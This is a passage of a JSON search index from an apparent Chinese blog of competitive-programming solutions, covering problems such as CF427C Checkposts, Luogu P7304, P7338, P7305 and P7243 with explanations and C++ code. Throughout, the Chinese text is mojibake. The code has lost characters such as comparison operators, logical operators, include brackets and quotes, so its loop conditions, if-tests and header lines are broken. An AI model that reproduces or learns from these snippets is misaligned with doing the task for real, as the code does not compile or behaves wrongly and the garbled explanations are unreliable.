ä¸Šä¸€ä¸ªè¾ƒå¤§çš„æ•°ï¼Œè¿™æ ·èƒ½å¤Ÿè¾ƒå¥½åœ°é¿å…æ–°åŠ çš„ç‰›çš„åæ ‡ä¼šå‡ºç°è´Ÿæ•°çš„æƒ…å†µã€‚","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF427C Checkposts","path":"/2021/02/19/CF427C/","content":"ç”±é¢˜å¯ä»¥çŸ¥é“ï¼Œæ¯ä¸€æ¡è¾¹éƒ½æ˜¯æœ‰å‘è¾¹ã€‚ä¸€ä¸ªæ£€æŸ¥ç«™åªèƒ½ä¿æŠ¤ä¸€ä¸ªç¯ä¸Šçš„è·¯å£ï¼Œå³æ£€æŸ¥ç«™çš„ä¸ªæ•°ä¹Ÿæ˜¯ç¯çš„ä¸ªæ•°ã€‚ é¢˜ç›®çš„ç¬¬ä¸€é—®æ±‚æœ€å°èŠ±è´¹ï¼Œä¹Ÿå°±æ˜¯å°±æ¯ä¸ªç¯ä¸Šå»ºä¸€ä¸ªæ£€æŸ¥ç«™çš„æœ€å°èŠ±è´¹ä¹‹å’Œã€‚å› æ­¤ç”¨ tarjan æ±‚å‡ºæ¯ä¸€ä¸ªå¼ºè”é€šåˆ†é‡ä»¥åŠè¯¥åˆ†é‡å†…çš„æœ€å°èŠ±è´¹ï¼Œæœ€åæ±‚ä¸€ä¸ªå’Œã€‚ void tarjan (int u)//æ¨¡æ¿å³å¯ low[u] = dfn[u] = ++times; s.push (u); for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) tarjan (v); low[u] = min (low[u],low[v]); else if (!scc[v]) low[u] = min (low[u],dfn[v]); if (low[u] == dfn[u]) ++scc_cnt; while (true) int x = s.top (); s.pop (); scc[x] = scc_cnt; mn[scc_cnt] = min (mn[scc_cnt],cost[x]);//æ±‚æœ€å°å€¼ if (x == u) break; æœ€åç›¸åŠ æ—¶æ³¨æ„æœ€å°èŠ±è´¹æ˜¯ä¸ç”¨å–æ¨¡çš„ï¼Œæ‰€ä»¥ç­”æ¡ˆä¸º $\\sum^{n}_{i = 1} mn[i]$ã€‚ å†æ¥çœ‹ç¬¬äºŒé—®ï¼Œæ±‚æ–¹æ¡ˆæ•°ã€‚ç”±äºè‚¯å®šè¦åšåˆ°æ¯ä¸€ä¸ªå¼ºè¿é€šåˆ†é‡ä¸­é€‰çš„æ£€æŸ¥ç«™èŠ±è´¹ä¸€å®šæœ€ä¼˜ï¼Œæ‰€ä»¥åªè¦æ±‚æ¯ä¸€ä¸ªåˆ†é‡ä¸­èŠ±è´¹ä¸º $mn[i]$ çš„ä¸ªæ•°ï¼Œç„¶åæ ¹æ®ä¹˜æ³•åŸç†å°†å®ƒä¹˜èµ·æ¥å³å¯ã€‚æ³¨æ„è¿™æ˜¯éœ€è¦å–æ¨¡çš„ï¼Œç­”æ¡ˆä¸º $\\prod^{n}_{i = 1} num[i]$ã€‚ for (int i = 1;i = n;++i) if (cost[i] == mn[scc[i]]) ++num[scc[i]];//è®¡æ•°for (int i = 1;i = scc_cnt;++i) ans_cnt = (ll)ans_cnt * num[i] % MOD;//ä¹˜æ³•åŸç†","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7304 [COCI2018-2019#1] Zamjena","path":"/2021/02/11/P7304/","content":"ä¸€é“å¹¶æŸ¥é›†çš„é¢˜ç›®ï¼Œå®ç°çš„æ—¶å€™ç»†èŠ‚è¾ƒå¤šã€‚ ã€æ³¨ï¼š ä»¥ä¸‹ fa ä¸ num æ•°ç»„çš„ $1 \\sim n$ å­˜ç¬¬ä¸€ä¸ªæ•°ç»„ï¼Œ $n + 1 \\sim 2n$ å­˜ç¬¬äºŒä¸ªæ•°ç»„ã€‚ã€‘å› ä¸ºä¸å­—ç¬¦æœ‰å…³ç³»ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ map æ¥è®°å½•æ¯ä¸€ä¸ªå˜é‡/æ•°å­—æ‰€å‡ºç°çš„ç¬¬ä¸€ä¸ªä½ç½®å¹¶æ ‡è®° fa[i] = iã€‚ if (num[a[i]] != 0) fa[i] = num[a[i]]; else fa[i] = num[a[i]] = i; æ¥ä¸‹æ¥å°±è¦ä»¥ $O(n)$ çš„æ—¶é—´å¤æ‚åº¦ä¾æ¬¡åˆ¤æ–­æ¯ä¸ªæ•°ç»„çš„ç¬¬ $i$ ä½æ˜¯å¦ç¬¦åˆè¦æ±‚äº†ã€‚è¿™é‡Œéœ€è¦è¿›è¡Œåˆ†ç±»è®¨è®ºï¼Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µ (è®¾ä¸¤ä¸ªæ•°ç»„åˆ†åˆ«ä¸º a ä¸ bï¼Œfind (int x) ä¸ºæ‰¾åˆ° $x$ çš„çˆ¶äº²)ï¼š $a_i$ ä¸ $b_i$ å‡ä¸ºå¸¸é‡ ç›´æ¥æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰å³å¯ $a_i$ ä¸ºå¸¸é‡ï¼Œ $b_i$ ä¸ºå˜é‡ 2.1. $b_i$ çš„å€¼å·²ç»ç¡®å®š æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰2.2. $b_i$ çš„å€¼æœªç¡®å®š fa[find (b[i])) = find (a[i]) $a_i$ ä¸ºå˜é‡ï¼Œ $b_i$ ä¸ºå¸¸é‡ 3.1. $a_i$ çš„å€¼å·²ç»ç¡®å®š æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰3.2. $a_i$ çš„å€¼æœªç¡®å®š fa[find (a[i])) = find (b[i]) $a_i$ ä¸ $b_i$ å‡ä¸ºå˜é‡ 4.1. $a_i$ ä¸ $b_i$ å‡å·²ç»ç¡®å®š æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰4.2. åªæœ‰ $a_i$ å·²ç»ç¡®å®š fa[find (b[i])) = find (a[i])4.3. åªæœ‰ $b_i$ å·²ç»ç¡®å®š fa[find (a[i])) = find (b[i])4.4. $a_i$ ä¸ $b_i$ å‡æœªç¡®å®š éšä¾¿é€‰ä¸€ä¸ªä½œä¸ºçˆ¶äº²ï¼Œè¿›è¡Œåˆå¹¶ äºæ˜¯å°±æœ‰ä»£ç ï¼š bool correct (int x) //bool isnumber[MAX 1],isok[MAX 1];//æ˜¯å¦æ˜¯æ•°å­—ï¼›æ˜¯å¦å·²ç¡®å®š int dx = find (num[a[x]]),dy = find (num[b[x]]); if (isnumber[x] isnumber[x + n]) if (a[x] != b[x]) return 0; else return 1; else if (isnumber[x]) if (dx == dy) isok[dx] = 1;return 1; else if (!isok[dy]) fa[dy] = dx,isok[dy] = 1; else return 0; else if (isnumber[x + n]) if (dx == dy) isok[dx] = 1;return 1; else if (!isok[dx]) fa[dx] = dy,isok[dx] = 1; else return 0; else if (!isok[dx] !isok[dy]) fa[dx] = dy; else if (!isok[dx]) fa[dx] = dy,isok[dx] = 1; else if (!isok[dy]) fa[dy] = dx,isok[dy] = 1; else if (dx != dy) return 0; return 1; æœ€åè‹¥æ‰€æœ‰è¿”å›å€¼éƒ½æ˜¯ 1ï¼Œåˆ™ç¬¦åˆé¢˜æ„ï¼›å¦åˆ™å°±æ˜¯ä¸ç¬¦åˆã€‚","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7338 ã€MdOI R4ã€Color","path":"/2021/02/10/P7338/","content":"è¿™æ˜¯ä¸€é“ä¸é”™çš„è´ªå¿ƒé¢˜ç›®ï¼ŒåŒæ—¶ä¹Ÿè€ƒå¯Ÿäº†é€‰æ‰‹ä»¬çš„è¯»é¢˜ä»”ç»†ç¨‹åº¦ã€‚å…ˆç»™å‡ºå‡ ä¸ªå…³é”®ç‚¹ï¼š åªèƒ½å¯¹ä¸¤ä¸ªç›¸é‚»ä¸”å‡ä¸ºç™½è‰²çš„æ ¼å­è¿›è¡ŒæŸ“è‰²ï¼Œä¹Ÿå°±æ˜¯è¯´æŸ“è‰²æ˜¯ä¸èƒ½å¤Ÿè¦†ç›–çš„ å¯¹äºè¾“å…¥ä¸­çš„ 1 çš„ä½ç½®ä¸€å®šè¦ä¸ºçº¢è‰²ï¼Œå…¶ä½™ä½ç½®éšæ„ã€‚ ä»¥æŸè¡Œçš„ç¬¬ $i$ åˆ— ($1 \\le i \\le n$)ä¸ºåŸºå‡†ï¼Œè‹¥æ‰€åœ¨çš„ä¸¤ä¸ªæ ¼å­å‡å­˜åœ¨ï¼Œåˆ™æœ‰å¯èƒ½çš„ä¸‰ç§æŸ“æ³•ï¼š $p_i$ ä¸ $q_i$ $p/q_i$ ä¸ $p/q_{i - 1}$ $p/q_i$ ä¸ $p/q_{i + 1}$ è¿™å…¶ä¸­æœ‰ä¸€ä¸ªè´ªå¿ƒçš„é¡ºåºï¼Œè‹¥è°ƒæ¢å¯èƒ½ä¼šå‡ºç°é”™è¯¯ã€‚æƒ³è¦å»è¿›è¡Œæœ€ä¼˜çš„æŸ“è‰²ä¸€å®šæ˜¯æŒ‰ç…§ $2\\to 1 \\to 3$ çš„é¡ºåºæ‰èƒ½å……åˆ†åˆ©ç”¨æ‰€æœ‰çš„ç™½è‰²æ ¼å­ã€‚æƒ³é€šè¿™ä¸ªåï¼Œæ¥ä¸‹å»å°±æ˜¯ä¸€äº›ç»†èŠ‚çš„å®ç°äº†ã€‚ n = read ();scanf (%s%s,da,db);ok = 1;for(register int i = 0;i = n;++i) ca[i] = cb[i] = 0;//æ³¨æ„ä¸€ä¸‹ï¼Œä¸è¦ç”¨ memset ä¼šè¶…æ—¶å“¦//0 white 1 red 2 bluefor (register int i = 0;i n;++i) if (da[i] == 1)//ç¬¬ä¸€è¡Œçš„ç¬¬ i å—éœ€è¦è¢«æŸ“è‰² if (ca[i] == 1) ;//å·²ç»è¢«æŸ“æˆç›®æ ‡è‰² //æ³¨æ„è¦ä¸¤ä¸ªæ ¼å­å‡å­˜åœ¨ä¸”å‡ä¸ºç™½è‰²æ‰èƒ½æŸ“ else if (!ca[i - 1] !ca[i] i = 1) ca[i - 1] = 2,ca[i] = 1;//2 else if (!ca[i] !cb[i] db[i] == 0) ca[i] = 1,cb[i] = 2;//1ï¼Œè¿™é‡Œè¦æ³¨æ„è‹¥ä¸¤è¡Œå‡ä¸º 1 åˆ™ä¸èƒ½è¿›è¡Œæ­¤æ“ä½œï¼Œå¦åˆ™ä¸æ˜¯æœ€ä¼˜æ–¹æ³•/æ— æ³•æˆåŠŸæŸ“è‰² else if (!ca[i + 1] !ca[i] da[i + 1] == 0 i n - 1) ca[i] = 1,ca[i + 1] = 2;//3 else ok = 0;break;//æ— æ³•å®ç° if (db[i] == 1)//ç¬¬äºŒè¡Œçš„ç¬¬ i å—éœ€è¦è¢«æŸ“è‰² if (cb[i] == 1) ; else if (!cb[i - 1] !cb[i] i = 1) cb[i - 1] = 2,cb[i] = 1; else if (!ca[i] !cb[i] da[i] == 0) ca[i] = 2,cb[i] = 1; else if (!cb[i + 1] !cb[i] db[i + 1] == 0 i n - 1) cb[i] = 1,cb[i + 1] = 2; else ok = 0;break; if (ok) printf (RP );else printf (++ );","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7305 [COCI2018-2019#1] Cipele","path":"/2021/02/08/P7305/","content":"è¿™æ˜¯ä¸€é“ç»ƒä¹ äºŒåˆ†çš„ä¸é”™çš„é¢˜ç›®ã€‚å› ä¸ºæ¯ç»„æ•°æ®çš„ç­”æ¡ˆçš„èŒƒå›´éƒ½å¯ä»¥è¢«ç®—å‡ºæ¥ï¼Œæ‰€ä»¥å°±å¯ä»¥å¯¹ç­”æ¡ˆè¿›è¡ŒäºŒåˆ†ç„¶ååˆ¤æ–­è¯¥ç­”æ¡ˆæ˜¯å¦åˆæ³•å³å¯ï¼Œè¿™æ ·æ—¶é—´å¤æ‚åº¦ä¹Ÿä¼šé™åˆ° $\\log$ çº§åˆ«ï¼Œæ‰€ä»¥ä¸ä¼šè¶…æ—¶ã€‚ å…ˆæ¥çœ‹çœ‹å¦‚ä½•æ±‚ç­”æ¡ˆçš„èŒƒå›´ã€‚ä¸ºäº†æ–¹ä¾¿ç¨‹åºçš„è®¡ç®—ï¼Œä»¥ä¸‹ä¿è¯ $n \\le m$ (è‹¥å‡ºç° $n m$ çš„æƒ…å†µï¼Œåˆ™è¾“å…¥å®Œæ¯•åå°† $n,m$ ä»¥åŠ $L_i,R_i$ è¿›è¡Œäº¤æ¢)ã€‚å¯¹äºæ‰€æœ‰å·¦è„šé‹ $L_i$ éƒ½æœ‰ä¸€ä¸ªå³è„šé‹ $R_i$ æ»¡è¶³ $L_i = R_i$ çš„æƒ…å†µï¼Œåˆ™æœ€å°çš„ç­”æ¡ˆä¸º $0$ï¼›å°†å·¦å³è„šé‹å­åˆ†åˆ«è¿›è¡Œæ’åºï¼Œç”±é¢˜å¯¹ä¸‘é™‹åº¦çš„å®šä¹‰å¯çŸ¥ï¼Œæœ€å¤§çš„ç­”æ¡ˆä¸º $\\min (|L[1] - R[m]|,|R[1] - L[n]|)$ã€‚ å¾—çŸ¥èŒƒå›´åï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯¹ç­”æ¡ˆçš„äºŒåˆ†äº†ã€‚äºŒåˆ†ç›®çš„æ˜¯è¦æ‰¾åˆ°ä¸€ä¸ªæœ€å°çš„åˆæ³•ç­”æ¡ˆï¼Œå› æ­¤è¦å†™æˆ r = mid ä¸ l = mid + 1ã€‚ while (l r) int mid = (l + r) 1; if (check (mid)) r = mid; else l = mid + 1; é‚£ä¹ˆå¦‚ä½•åˆ¤æ–­è§£æ˜¯å¦åˆæ³•å‘¢ï¼Ÿè®¾å½“å‰çš„å¾…åˆ¤æ–­çš„ç­”æ¡ˆä¸º $num$ï¼Œç”¨æ•°é‡è¾ƒå°‘çš„é‹å­å»åŒ¹é…æ•°é‡è¾ƒå¤šçš„é‹å­(ç”±äºå‰æ–‡è§„å®šäº† $n m$ï¼Œä¹Ÿå°±æ˜¯ç”¨å·¦è„šé‹å»åŒ¹é…å³è„šé‹)ï¼Œåˆ©ç”¨è´ªå¿ƒçš„æ€æƒ³ï¼Œå¯¹äºæ¯ä¸€åªå·²ç»ä»å°åˆ°å¤§æ’å¥½çš„å·¦è„šé‹ï¼Œè¦æ‰¾åˆ°ä¸€åªå³è„šé‹æ»¡è¶³ $|L_i - R_j| \\le num$ åå†å»åŒ¹é…ä¸‹ä¸€åªå·¦è„šé‹ã€‚è‹¥åœ¨å·¦è„šé‹æ»¡è¶³åœ¨èŒƒå›´å†…å…¨éƒ¨æˆåŠŸä¸å³è„šé‹åŒ¹é…çš„æƒ…å†µï¼Œåˆ™ç­”æ¡ˆåˆæ³•ï¼Œå¦åˆ™ä¸åˆæ³•ã€‚ bool check (int num)//to check whether the answer is correct or not int cnt = 1; for (int i = 1;i = n;++i) while (cnt = m abs (a[i] - b[cnt]) num) ++cnt;//plus cnt until find a correct answer if (cnt m) return 0; ++cnt;//find it return 1; æœ€åé€€å‡ºå¾ªç¯ while (l r) åå¾—åˆ°çš„ $l$ å°±æ˜¯ç­”æ¡ˆå•¦ï¼","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7258 [COCI2009-2010#3] SLATKISI","path":"/2021/01/31/P7258/","content":"è¿™é“é¢˜ç›®çš„æœ¬è´¨è¿˜æ˜¯å¯¹äºå››èˆäº”å…¥çš„ç†è§£ã€‚ å¯¹äºä¸€ä¸ªä½ä¸Šçš„æ•° $x$ï¼Œè‹¥ $0 \\le x \\le 4$ï¼Œåˆ™ä¼šèˆåˆ° $0$ï¼›è‹¥ $5 \\le x \\le 9$ï¼Œåˆ™ä¼šè¿›ä¸€ä½åˆ° $10$ã€‚è€Œé¢˜ç›®ä¸­çš„é›¶æ•° $k$ ä¸º $0-9$ï¼Œåˆ†åˆ«ä»£è¡¨ä¸ªã€åã€ç™¾ $\\cdots$ã€‚ å› æ­¤å¯ä»¥ä¸ºä¸€ä¸ªæ•°çš„ä¸€åŠä¸ºç•Œè¿›è¡Œåˆ¤æ–­ï¼Œå››èˆåªè¦æŠ¹å»ä½™æ•°ï¼Œäº”å…¥åˆ™éœ€åŠ ä¸Šé™¤ä½™æ•°ä¸è¶³çš„éƒ¨åˆ†ï¼Œä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;ll read ();ll a[15] = 1,10,100,1e3,1e4,1e5,1e6,1e7,1e8,1e9;//å…ˆå­˜å…¥é¢˜ç›®ä¸­çš„æ•°int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); ll c = read (); ll k = read (); if (c % a[k] (a[k] 1)) printf (%d ,c - c % a[k]);//å‡å»ä½™æ•° else printf (%d ,c - c % a[k] + a[k]);//åŠ ä¸Šå‰©ä½™éƒ¨åˆ† return 0;ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7190 [COCI2007-2008#6] SEMAFORI","path":"/2021/01/23/P7190/","content":"ç”±é¢˜å¯çŸ¥è·¯ç¨‹æ‰€èŠ±è´¹çš„æ—¶é—´ä¸€å®šä¸º $l$ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è®¡ç®—çš„ä¾¿æ˜¯ç­‰å¾…çº¢ç¯æ‰€èŠ±è´¹çš„æ—¶é—´ã€‚ Luka å¼€å§‹å¼€è½¦æ—¶ï¼Œæ‰€æœ‰äº¤é€šä¿¡å·ç¯éƒ½å‘ˆçº¢è‰²ï¼Œå¹¶ä¸”å¼€å§‹å¾ªç¯ã€‚ ä¿¡å·ç¯å°†æŒ‰ $d$ å‡åºæ’åˆ—ã€‚ è¿™ä¸¤å¥è¯æ˜¯æœ¬é¢˜çš„å…³é”®ã€‚å› ä¸ºæœ‰åºè¯»å…¥çº¢ç»¿ç¯çš„è·ç¦»ï¼Œæ‰€ä»¥åªè¦ä» $1$ è‡³ $n$ é¡ºæ¬¡æšä¸¾ã€‚ç”±é¢˜æ„çŸ¥æ¯ä¸ªçº¢ç»¿ç¯çš„å‘¨æœŸä¸º $g_i + r_i$ï¼Œæ‰€ä»¥æ¯åˆ°ä¸€ä¸ªè·¯å£æ—¶ï¼Œåˆ¤æ–­å½“å‰çš„çŠ¶å†µï¼Œè‹¥ä¸ºçº¢ç¯ï¼Œåˆ™åœ¨ç­”æ¡ˆä¸­åŠ ä¸Šç­‰çº¢ç¯çš„æ—¶é—´ï¼Œå¹¶ä¼šå½±å“ä¸‹ä¸€æ¬¡çš„æƒ…å†µåˆ¤æ–­ã€‚ ç»™ä¸‹ä»£ç ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 150;const int MOD = 1e9 + 7;ll read ();int n,m,ans; struct traffic int s,r,g; a[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) a[i].s = read (); a[i].r = read (); a[i].g = read (); for (int i = 1;i = n;++i) ans += a[i].s - a[i - 1].s;//è·¯ç¨‹è·ç¦» int rest = ans % (a[i].r + a[i].g);//ç•™ä¸‹å•ä¸ªå‘¨æœŸçš„ä¸å®Œæ•´éƒ¨åˆ† if (rest a[i].r) ans += a[i].r - rest;//ç­‰å¾…çº¢ç¯çš„æ—¶é—´ printf (%d ,ans + (m - a[n].s));//æœ€åçš„è·¯ç¨‹ä¸èƒ½å¿˜ return 0;ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7273 ix35 çš„ç­‰å·®æ•°åˆ—","path":"/2021/01/16/P7273/","content":"æšä¸¾å…¬å·®ï¼Œå› ä¸º $1 \\le a_i \\le w$ï¼Œæ‰€ä»¥æ˜“å¾—å…¬å·® $d \\le \\frac{w}{n}$ã€‚ æ¥ä¸‹æ¥æšä¸¾æ•°åˆ—çš„ç¬¬ä¸€ä¸ªæ•°ä¸º $k$ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è¡¨ç¤ºå‡ºè¯¥æ•°åˆ—çš„ç¬¬ $i$ é¡¹ä¸º $k + d \\times (i - 1)$ã€‚å› ä¸ºæ•°åˆ—çš„é¡¹æ•°ä¸å…¬å·®ä¸å˜ï¼Œå³ $a_i$ æ‰€å¯¹åº”çš„ $k$ æ˜¯å”¯ä¸€çš„(åªæœ‰ä¸€ä¸ª $k$ ç¬¦åˆæ¡ä»¶)ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¤„ç†å‡ºå½“ $k$ ä¸ºç¬¬ä¸€é¡¹æ—¶ï¼Œæ•°åˆ—ä¸­æœ‰å¤šå°‘ä¸ªæ•°ä¸éœ€è¦è¢«ä¿®æ”¹ã€‚æ ¹æ®åˆšåˆšè¡¨ç¤ºçš„æ•°åˆ—ä¸­ç¬¬ $i$ é¡¹çš„æ•°ï¼Œå¯ä»¥å¾—åˆ° $a_i$ æ‰€å¯¹åº”çš„ $k$ ä¸º $a_i - d \\times (i - 1)$ã€‚ ä¸€ä¸ªéœ€è¦æ³¨æ„çš„æ¡ä»¶å°±æ˜¯ä¿®æ”¹åæ¯ä¸ªæ•°çš„èŒƒå›´æ˜¯ $1 \\le a_i \\le w$ï¼Œè¿™ä¸ªéœ€è¦ä½“ç°åœ¨ä½ çš„ç¨‹åºä¸­ï¼ŒåŒæ—¶è¿˜è¦æ³¨æ„ä¸€ä¸‹æ•°æ®ç±»å‹(å¯èƒ½å¤„ç†æ—¶ä¼šçˆ† int)ã€‚ æœ€åç»™ä¸€ä¸ªä»£ç å§ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const ll MAX = 3e5 + 5;const ll MOD = 1e9 + 7;ll read ();ll a[MAX],b[MAX];ll n,m,ans,num,s;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (ll i = 1;i = n;++i) a[i] = read (); ans = n - 1;//æœ€å¤§å€¼ for (int num = 0;num = m / n;++num) init (b);s = 0; ++b[a[1]];//ç¬¬ä¸€é¡¹åˆ«å¿˜äº†å¤„ç† for (ll i = 2;i = n;++i) ll tmp = a[i] - (i - 1) * num; if (tmp = 0 || tmp + (n - i) * num m) continue;//ä¸ç¬¦åˆçš„æƒ…å†µ ++b[tmp];//å½“ç¬¬ä¸€é¡¹ä¸º a[i] - (i - 1) * num æ—¶ï¼Œç¬¬ i é¡¹ä¸éœ€è¦ä¿®æ”¹ s = max (b[tmp],s); ans = min (ans,n - s); printf (%lld ,ans); return 0;ll read () ll s = 0;ll f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼š[ABC113B] Palace","path":"/2021/01/09/ABC113B/","content":"é¢˜ç›®çš„å¤§æ„ä¾¿æ˜¯æ‰¾åˆ° $|T - h_i \\times 6 \\times 10^{-3} - A|$ ä¸ºæœ€å°å€¼çš„ä¸‹æ ‡å¹¶è¾“å‡º $i$ã€‚ å› æ­¤æˆ‘ä»¬å…ˆå°†è¿™ä¸ªå€¼è®¾ä¸º 0x3f3f3f3fï¼Œå³æ­£æ— ç©·ï¼Œç„¶åæ¯æ¬¡è¾“å…¥è¿›è¡Œä¸€æ¬¡æ¯”è¾ƒï¼Œè‹¥æ¯”åŸç­”æ¡ˆæ›´ä¼˜ï¼Œåˆ™å°†å…¶è¿›è¡Œæ›´æ–°ï¼Œå¹¶è®°å½•ä¸‹æ ‡ã€‚æœ€åè¾“å‡ºä¸‹æ ‡å³å¯ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;ll read ();int n,t,A,ans;double sum = INF; int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();t = read ();A = read (); for (int i = 1;i = n;++i) int x;x = read (); if (sum abs (t - x * 0.006 - A)) ans = i,sum = abs (t - x * 0.006 - A);//compare printf (%d ,ans); return 0;ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7243 æœ€å¤§å…¬çº¦æ•°","path":"/2021/01/03/P7243/","content":"å¯¹äº $a_{x,y}$ï¼Œä¸€å…±æœ‰ä¸‰ç§æƒ…å†µï¼Œåˆ†åˆ«åˆ—ä¸¾ä¸€ä¸‹ï¼š åˆå§‹å€¼ä¸º $1$ã€‚ æ­¤æ—¶ä¸éœ€è¦ç»è¿‡å˜æ¢ï¼Œç›´æ¥è¾“å‡º $0$ã€‚ ç»è¿‡è‹¥å¹²æ¬¡å˜æ¢éƒ½ä¸ä¼šå˜ä¸º $1$ã€‚ è¿™ç§æƒ…å†µæ˜¾ç„¶è¾“å‡º $-1$ã€‚ä½†æ˜¯è¯¥å¦‚ä½•åˆ¤æ–­å®ƒå‘¢ï¼Ÿ è€ƒè™‘ä¸€ä¸‹ï¼Œåœ¨ $n \\times m$ çš„æ–¹é˜µä¸­ï¼Œè‹¥æœ‰ä¸¤ä¸ªæ•° $a_{x_1,y_1}$ ä¸ $a_{x_2,y_2}$ æ»¡è¶³ $\\gcd(a_{x_1,y_1},a_{x_2,y_2}) = 1$ï¼Œé‚£ä¹ˆç»è¿‡è‹¥å¹²æ¬¡çš„å˜æ¢åä¸€å®šèƒ½ä½¿æ‰€æœ‰çš„ä½ç½®ä¸Šçš„æ•°å˜ä¸º $1$ã€‚ åœ¨ä¸€æ¬¡å˜æ¢åçš„ç›¸å…³çš„ $5$ ä¸ªä½ç½®ï¼Œéƒ½ä¼šå˜ä¸º $1$ æˆ–è€…æ˜¯å®ƒä»¬ä¸­çš„æŸä¸€ä¸ªæ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ä»¥æ¯ä¸ªç‚¹ä¸ºä¸­å¿ƒçš„ $5$ ä¸ªä½ç½®éƒ½ä¼šæ”¹å˜ã€‚å› æ­¤ä¸Šè¿°çš„æƒ…å†µæ˜¯æˆç«‹çš„ã€‚ ä¹Ÿå°±æ˜¯æŠŠè¯¥æ–¹é˜µä¸­çš„æ‰€æœ‰æ•°åšä¸€é $\\gcd$ï¼Œè‹¥ç­”æ¡ˆä¸ä¸º $-1$ï¼Œä¹Ÿå°±æ˜¯æ— è§£çš„æ ‡å¿—ã€‚ åœ¨æœ‰é™æ¬¡æ•°å†…èƒ½å˜ä¸º $1$ã€‚ é¦–å…ˆè€ƒè™‘æš´åŠ›ï¼Œæ¨¡æ‹Ÿæ¯ä¸€æ¬¡çš„å˜æ¢è¿‡ç¨‹ï¼Œå¤§æ¦‚èƒ½æ‹¿åˆ° $45\\texttt{Pts}$ çš„å¥½æˆç»©ã€‚ çœ‹å›åˆ°æƒ…å†µ $2$ï¼Œéšæ‰‹æ‹¿å‡ ä¸ªæ ·ä¾‹æ¨ä¸€ä¸‹ï¼Œå‘ç°è‹¥ $\\gcd(a_{x,y},a_{xâ€™,yâ€™}) = 1$ï¼Œéœ€è¦ $|x - xâ€™| + |y - yâ€™|$ æ¬¡åæ‰èƒ½å˜æ¢ä¸º $1$ã€‚è¿™ä¸å°±æ˜¯æ›¼å“ˆé¡¿è·ç¦»å˜›ï¼Œè¿™æ ·ä¹Ÿå°±å¥½å†™äº†ã€‚ æœ€åæ”¾ä¸€ä¸ªä¼ªä»£ç ï¼ŒåŒæ—¶ä¹Ÿç¥å¤§å®¶åœ¨ $2021$ å¹´ä¸­ $\\texttt{rp++}$ã€‚ int main () for (int i = 1;i = n;++i)//n * m çš„ä¸€é gcd for (int j = 1;j = m;++j) if (i == 1 j == 1) all = a[i][j]; else all = work (all,a[i][j]); if (all != 1)//ç‰¹åˆ¤ printf (-1 ); return 0; if (a[x][y] == 1)//ç‰¹åˆ¤ printf (0 ); return 0; for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) if (i == x j == y) continue;//èµ·ç‚¹ä½ç½® if (abs (x - i) + abs(y - j) = ans) continue;//ä¸€ä¸ªå°ä¼˜åŒ– if (work (a[i][j],a[x][y]) == 1) ans = min (ans,abs (x - i) + abs(y - j)); printf (%lld ,ans); return 0;ll work (ll x,ll y)//è¾—è½¬ç›¸é™¤ return (y == 0 ? x : work (y,x % y));","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP4171 [JSOI2010]æ»¡æ±‰å…¨å¸­","path":"/2020/12/12/P4171/","content":"è¯´ç™½äº†ï¼Œè¿™å°±æ˜¯ä¸€ä¸ª $\\texttt{2-SAT}$ çš„æ¨¡æ¿é¢˜ï¼Œå¤§è‡´å¯ä»¥åˆ†æˆä¸‰ä¸ªéƒ¨åˆ†ã€‚ 